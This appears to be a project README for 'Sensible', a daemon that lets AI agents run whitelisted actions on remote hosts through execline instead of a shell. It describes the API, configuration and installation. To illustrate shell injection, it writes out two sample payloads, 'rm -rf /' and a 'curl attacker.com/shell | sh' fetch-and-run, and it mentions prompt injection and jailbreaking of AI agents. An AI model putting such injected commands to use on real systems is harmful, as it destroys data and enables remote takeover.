# Sensible

**Remote execution for AI agents — safer by default.**

Sensible gives AI a remote execution capability similar to SSH/Ansible
but with guardrails that make it safer to delegate. The remote execution 
step is performed as an `execlineb` script rather than as a shell script. 

This approach still has the flexibility needed for most requirements,
the script is inherantly resistant to injection attacks and it is
straightforward to add explicit guardrails using simple black
and whitelisting.

## The Problem

Widespread SSH/Ansible access to servers for automating tasks is an obvious
attack surface that ought not to be handed directly to AI agents who are
themselves vulnerable to persuasion to nefarious ends.

- **Prompt injection** — malicious input tricks AI into executing attacker commands
- **Guardrail workarounds** - Agents upload scripts to avoid blacklisted commands
- **Jailbroken AI** — AI's easily ignore their safety guidelines
- **Too much power** — AI can do anything, not just the intended task
- **Whitelist requirement** - unnecessarily opens up the remote execution attack vector

> You wouldn't give a junior dev root SSH. Treat AI the same way.

## The Solution

```
SSH to clients     →     Sensible to clients
     ↓                          ↓
  Full access              Safe access
  Everything               Restricted actions
  Audit logs               JSON audit trail
```

**Sensible = SSH/Ansible access, AI-safe edition**

Same actions. Same hosts. But with guardrails that make AI delegation responsible.

## How It Works

```
┌─────────────┐     HTTP/JSON      ┌──────────────────┐     execline      ┌─────────┐
│  AI Agent   │ ──────────────────► │   sensibled       │ ─────────────────► │ actions │
│             │ ◄────────────────── │   (daemon)       │ ◄───────────────── │  dir    │
└─────────────┘    JSON response    └──────────────────┘    stdout/stderr    └─────────┘
     │                                       │
     │         API key + whitelist           │
     └─────────────────────────────────────┘
```

1. **Bootstrap** — ISV SSHs to client, installs sensible + API key + whitelist
2. **Execute** — AI calls sensible over HTTP with request
3. **Validation** — Action checked against whitelist, args validated
4. **Execution** — execline runs action (not shell, prevents injection)
5. **Response** — JSON with audit trail: stdout, stderr, duration, exit code

## Why execline?

**Shell is fundamentally unsafe for AI execution. The guardrail is execline.**

```bash
# This is a security nightmare:
ai_output="compile; rm -rf /"  # injected via prompt
./run.sh $ai_output            # runs: compile; rm -rf /

# Even "safe" commands are vulnerable:
./build.sh $USER_INPUT        # user_input = "; curl attacker.com/shell | sh"
```

**execline eliminates shell as an attack vector:**

| Shell | execline |
|-------|----------|
| `$VAR` interpolation | `import -env VAR` — explicit, no magic |
| `cmd1; cmd2` chaining | Not possible without explicit `background` |
| `cmd1 && cmd2` | Not an operator — `if` is a builtin |
| `-c "$(cat)"` | `execlineb "$file"` — file never interpreted |

**The guardrail: No shell. No interpretation layer. No injection surface.**

Even if API key is compromised, whitelist limits actions. Even if whitelist bypassed, execline prevents shell injection.

## API

Single endpoint handles everything. Sensible decides sync vs async based on action timeout.

### Execute

```
GET|POST /sensible?request=<action> [--arg=val]
GET|POST /sensible?request=<action> [--arg=val]&field=<field>
```

| Response | Meaning |
|----------|---------|
| HTTP 200 | Task completed. Body is result. |
| HTTP 202 | Task queued (long-running). Body is `{id: "..."}`. |

**Examples:**

```bash
# Quick task (runs sync)
curl "GET /sensible?request=status&field=id"
→ status-123

# Long task (returns ID, runs async)
curl "POST /sensible?request=compile --target=linux&field=id"
→ task-456
# HTTP 202

# Full result for short task
curl "POST /sensible?request=status"
{
  "id": "status-123",
  "status": "success",
  "exit_code": 0,
  "stdout": "Server is healthy\n",
  "stderr": "",
  "duration_ms": 12,
  "timestamp": "2026-04-23T17:00:00Z"
}
```

### Check Status

```
GET /sensible/:id
GET /sensible/:id?field=<field>
```

```bash
# Poll for completion
while curl -s "GET /sensible/task-456?field=exit_code" | grep -q "null"; do
  sleep 1
done

# Get result
curl "GET /sensible/task-456?field=stdout"
# "Build complete\n"
```

### Chain Tasks

Wait for one task to complete before starting another:

```
POST /sensible/:id?request=<action> [--arg=val]
```

```bash
# compile, then test, then deploy
ID=$(curl -s "POST /sensible?request=compile --target=linux&field=id")
TEST_ID=$(curl -s "POST /sensible/$ID?request=test&field=id")
curl -s "POST /sensible/$TEST_ID?request=deploy"
```

### Field Extraction

Use `field=` to get just that value. No JSON parsing needed.

```bash
curl "GET /sensible?request=status&field=id"       # status-123
curl "GET /sensible?request=status&field=stdout"   # Server is healthy
curl "GET /sensible?request=status&field=exit_code" # 0
```

Fields: `id`, `status`, `exit_code`, `stdout`, `stderr`, `duration_ms`, `timestamp`

### Timeout

Default timeout is 15s. Actions exceeding this run async (HTTP 202).

Override how long client is willing to wait:

```bash
# Wait up to 60s for compile
curl "POST /sensible?request=compile --target=linux&timeout=60"

# Never wait (always async)
curl "POST /sensible?request=status&timeout=0"
```

## HTTP Status Codes

| Code | Meaning |
|------|---------|
| 200 | Complete — body is result |
| 202 | Queued — body is `{id}` |
| 400 | Bad request — invalid syntax |
| 401 | Unauthorized — bad API key |
| 403 | Forbidden — action not whitelisted |
| 404 | Not found — task ID unknown |
| 500 | Internal error |

## Installation

### Run

```bash
# Standalone (port)
sensible serve --port 8443

# Behind reverse proxy (/sensible path)
sensible serve --path /sensible
```

### Bootstrap via SSH

```bash
# Build installer
makeself.sh sensible sensible-installer.sh "Sensible" "./sensible install"

# Deploy to clients
sensible deploy --hosts=web1,web2 --ssh-user=root --installer=sensible-installer.sh
```

## Configuration

### Whitelist (`/etc/sensible/whitelist.yaml`)

```yaml
actions:
  - name: status
    timeout: 10
  - name: compile
    timeout: 600
  - name: restart
    timeout: 60
  - name: update
    timeout: 300
```

### API Keys (`/etc/sensible/keys/`)

```
/etc/sensible/keys/
├── isv.pem          # ISV's key
└── ai-agent.pem     # AI's key
```

## Project Structure

```
sensible/
├── cmd/sensible/     # Daemon + CLI
├── pkg/
│   ├── daemon/        # HTTP server
│   ├── deploy/       # SSH bootstrap
│   └── config/       # Config loading
├── actions/          # Built-in actions
├── Makefile
└── README.md
```

## Relationship to Groan

**Groan** — CLI builder (shell scripts → hierarchical CLI)

**Sensible** — Remote execution for Groan CLIs

```
groan compile --target=linux      # Local
sensible compile --target=linux   # Remote
```

Sensible executes Groan CLI remotely via execline.

## Relationship to host-actions

**host-actions** — Sensible for containers (file queue + dispatch)

**Sensible** — Sensible for hosts (HTTP + SSH bootstrap)

Both share: execline execution, whitelist hardening, CLI-native for AI.

Transport differs:
- host-actions: volume mount + systemd
- sensible: HTTP + SSH bootstrap

## License

MIT
